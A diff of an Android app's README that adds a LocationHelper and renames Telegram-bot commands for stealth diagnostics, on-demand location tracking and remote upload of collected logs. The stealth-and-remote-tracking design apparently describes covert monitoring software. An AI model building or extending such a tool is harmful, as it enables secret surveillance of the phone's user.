@@ -47,15 +47,16 @@ app/src/main/
 │   ├── data/          # Room DB, Repository, EncryptedPrefsManager
 │   ├── utils/         # StealthManager, SecureDelete
 │   ├── network/       # TelegramClient, CommandProcessor (Real-time Polling), GithubUpdater
-│   └── utils/         # LogUploadHelper (MD Table), DeviceInfoHelper (Hardware Stats), SecureDelete
+│   └── utils/         # LocationHelper, LogUploadHelper, DeviceInfoHelper (Hardware Stats), SecureDelete
 ├── res/               # Android Resources (Layouts, Strings)
 └── AndroidManifest.xml
 ```
 
 ## Supported Commands
-*   `/ping`: Dynamic heartbeat status and next cycle estimate.
-*   `/hwinfo`: Real-time hardware diagnostics (Battery, Storage, Uptime).
-*   `/getlogs`: Immediate upload of current log database as `.md` file.
-*   `/wipe`: Purge all local logs.
-*   `/setpin`: Remote PIN change for app security.
-*   `/exception`: Manage notification filtering.
+*   `/stat`: Dynamic heartbeat status and stealth remote diagnostics (Battery, Network, Ring Profile, Storage).
+*   `/fetch_loc`: Request on-demand location tracking on next cycle.
+*   `/fetch_logs`: Immediate upload of current log database.
+*   `/fetch_all`: Retrieve location and logs together.
+*   `/config_wipe`: Purge all local logs.
+*   `/config_pin`: Remote PIN change for app security.
+*   `/config_exc_*`: Manage notification filtering exceptions.
